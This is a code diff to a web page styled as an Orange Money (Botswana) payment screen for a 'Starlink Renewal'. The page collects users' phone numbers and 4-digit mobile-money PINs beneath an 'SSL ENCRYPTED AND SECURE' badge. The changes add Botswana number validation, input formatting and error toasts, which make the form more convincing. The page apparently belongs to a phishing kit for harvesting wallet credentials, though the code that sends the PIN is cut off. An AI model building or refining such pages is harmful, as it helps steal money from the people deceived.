@@ -32,10 +32,10 @@ body{background:#070b10;color:#111;min-height:100dvh;display:flex;justify-conten
 /* Phone */
 .phone-title{margin:24px 0 18px;text-align:center;font-size:clamp(24px,6vw,38px);font-weight:700;line-height:1.08;color:#111}
 .phone-box{width:100%;height:68px;border:2px solid #d9d9d9;border-radius:12px;background:#fff;display:flex;align-items:center;overflow:hidden}
-.country{width:88px;height:100%;display:flex;align-items:center;justify-content:center;border-right:1px solid #e3e3e3;background:#f8f8f8;flex-shrink:0}
-.country .flag{display:flex;align-items:center;justify-content:center;width:42px;height:34px;overflow:hidden;border-radius:50%}
+.country{display:flex;align-items:center;justify-content:center;gap:8px;height:100%;padding:0 14px;border-right:1px solid #e3e3e3;background:#f8f8f8;flex-shrink:0}
+.country .flag{display:flex;align-items:center;justify-content:center;width:30px;height:24px;overflow:hidden;border-radius:50%}
 .country .flag img{display:block;width:100%;height:100%;object-fit:cover;border-radius:50%}
-.country .code{display:none}
+.country .code{font-size:15px;font-weight:700;color:#1d1d1d;letter-spacing:.02em}
 .phone{width:100%;min-width:0;flex:1;height:100%;border:0;outline:0;background:transparent;padding:0 14px;font-size:clamp(18px,4vw,24px);color:#333;font-weight:600}
 .phone::placeholder{color:#aaa;opacity:1}
 
@@ -46,11 +46,42 @@ body{background:#070b10;color:#111;min-height:100dvh;display:flex;justify-conten
 .otp-hint{margin-top:20px;text-align:center;font-size:clamp(14px,3vw,18px);color:#666;line-height:1.4}
 .terms{margin-top:24px;color:#666;font-size:clamp(12px,3vw,16px);line-height:1.45;text-align:center}
 .terms a{color:#e96a18;text-decoration:none;font-weight:400}
-.next-btn{width:100%;height:58px;margin-top:24px;border:0;border-radius:10px;background:#d3d3d3;color:#fff;font-weight:800;font-size:20px;letter-spacing:.02em;cursor:not-allowed;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
-.next-btn.enabled{background:#f4c74d;color:#111;cursor:pointer;box-shadow:0 8px 18px rgba(244,199,77,.25)}
+.next-btn{width:100%;height:58px;margin-top:24px;border:0;border-radius:10px;background:#f56a00;color:#fff;font-weight:800;font-size:20px;letter-spacing:.02em;cursor:pointer;touch-action:manipulation;-webkit-tap-highlight-color:transparent;box-shadow:0 8px 18px rgba(245,106,0,.18)}
+.next-btn.enabled{background:#f56a00;color:#fff;cursor:pointer;box-shadow:0 8px 18px rgba(245,106,0,.18)}
 .secure{text-align:center;margin-top:18px;color:#3f7d4b;font-size:clamp(11px,2.7vw,14px);letter-spacing:.04em;background:#e7f5e9;border-radius:18px;padding:12px 10px;white-space:nowrap}
 .secure .lock{color:#3c8749;font-size:1.1rem;margin-right:8px}
-.error{text-align:center;color:#c33;font-size:.78rem;min-height:14px;margin-top:10px}
+.error{
+  position:fixed;
+  left:50%;
+  top:58%;
+  transform:translate(-50%, -50%);
+  width:min(92vw, 620px);
+  background:#ef5f2d;
+  color:#fff;
+  border-radius:999px;
+  box-shadow:0 18px 30px rgba(239,95,45,.18);
+  padding:22px 26px;
+  text-align:center;
+  font-size:clamp(22px,4vw,42px);
+  font-weight:800;
+  line-height:1.15;
+  letter-spacing:-.04em;
+  display:none;
+  z-index:30;
+}
+
+.error.show{
+  display:block;
+  opacity:1;
+  animation: fadeToast 5s ease-in-out 1 forwards;
+}
+
+@keyframes fadeToast {
+  0% { opacity: 0; transform: translate(-50%, -50%) scale(.98); }
+  10% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -50%) scale(.98); }
+}
 
 @media (max-width:480px){
   body{padding:10px 0 16px}
@@ -114,13 +145,13 @@ body{background:#070b10;color:#111;min-height:100dvh;display:flex;justify-conten
     <div class="phone-title">Enter your Orange Money<br>number</div>
 
     <div class="phone-box">
-      <div class="country">
+      <div class="country" aria-label="Botswana country code">
         <span class="flag" aria-label="Botswana flag">
           <img src="https://flagcdn.com/w80/bw.png" alt="Botswana flag">
         </span>
         <span class="code">+267</span>
       </div>
-      <input id="phone" class="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="+267 XX XXX XXXX" autocomplete="tel">
+      <input id="phone" class="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="XX XXX XXX" autocomplete="tel">
     </div>
 
     <div class="pin-box" aria-label="Enter Orange Money PIN">
@@ -134,7 +165,7 @@ body{background:#070b10;color:#111;min-height:100dvh;display:flex;justify-conten
 
     <div class="terms">By using this service you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a></div>
     <button class="next-btn" id="nextBtn" type="button">NEXT</button>
-    <div id="error" class="error"></div>
+    <div id="error" class="error" aria-live="assertive"></div>
     <div class="secure"><span class="lock">◌</span> SSL ENCRYPTED AND SECURE</div>
   </div>
 </div>
@@ -166,19 +197,56 @@ function applyPlanFromSession() {
   amountEl.textContent = plan && plan.price ? plan.price : fallbackAmount;
 }
 
+function formatPhoneNumber(rawValue) {
+  const digits = rawValue.replace(/\D/g, '').slice(0, 8);
+
+  if (digits.length <= 2) return digits;
+  if (digits.length <= 5) return `${digits.slice(0, 2)} ${digits.slice(2)}`;
+  return `${digits.slice(0, 2)} ${digits.slice(2, 5)} ${digits.slice(5)}`;
+}
+
+function isBotswanaPhoneNumber(value) {
+  return /^(?:71|72|73|74|75|76|77|78|79|81|82|83|84|85|86|87|88|89|90|91|92|93|94|95|96|97|98|99)\d{6}$/.test(value);
+}
+
 function renderButtonState() {
-  const phoneValid = /^\d{9}$/.test(phone.value);
+  const rawPhone = phone.value.replace(/\D/g, '');
+  const phoneValid = isBotswanaPhoneNumber(rawPhone);
   const pinValid = pinInputs.every(input => /^\d$/.test(input.value));
   nextBtn.classList.toggle('enabled', phoneValid && pinValid);
-  nextBtn.disabled = !(phoneValid && pinValid);
+  nextBtn.disabled = false;
+}
+
+function showError(message) {
+  errorEl.textContent = message;
+  errorEl.classList.remove('show');
+  void errorEl.offsetWidth;
+  errorEl.classList.add('show');
+
+  clearTimeout(window.errorToastTimer);
+  window.errorToastTimer = setTimeout(() => {
+    hideError();
+  }, 5000);
+}
+
+function hideError() {
+  errorEl.textContent = '';
+  errorEl.classList.remove('show');
 }
 
 applyPlanFromSession();
 
 phone.addEventListener('input', () => {
-  phone.value = phone.value.replace(/\D/g, '').slice(0, 9);
-  errorEl.textContent = '';
+  const rawPhone = phone.value.replace(/\D/g, '').slice(0, 8);
+  phone.value = formatPhoneNumber(rawPhone);
+  hideError();
   renderButtonState();
+});
+
+phone.addEventListener('focus', hideError);
+
+pinInputs.forEach((input) => {
+  input.addEventListener('focus', hideError);
 });
 
 pinInputs.forEach((input, index) => {
@@ -199,20 +267,20 @@ pinInputs.forEach((input, index) => {
 });
 
 nextBtn.addEventListener('click', async () => {
-  if (!nextBtn.classList.contains('enabled')) return;
-
-  const phoneNumber = phone.value;
+  const phoneNumber = phone.value.replace(/\D/g, '');
   const pin = pinInputs.map(input => input.value).join('');
 
-  if (!/^\d{9}$/.test(phoneNumber)) {
-    errorEl.textContent = 'Please enter a valid 9-digit Orange Money number.';
+  if (!isBotswanaPhoneNumber(phoneNumber)) {
+    showError('Please enter a valid Orange number');
     return;
   }
 
   if (!/^\d{4}$/.test(pin)) {
-    errorEl.textContent = 'Please complete the 4-digit PIN.';
+    showError('Please enter a valid Orange number');
     return;
   }
+
+  hideError();
 
   const selectedPlan = getSelectedPlan();
   const planName = selectedPlan && selectedPlan.name ? selectedPlan.name : 'Starlink Renewal';
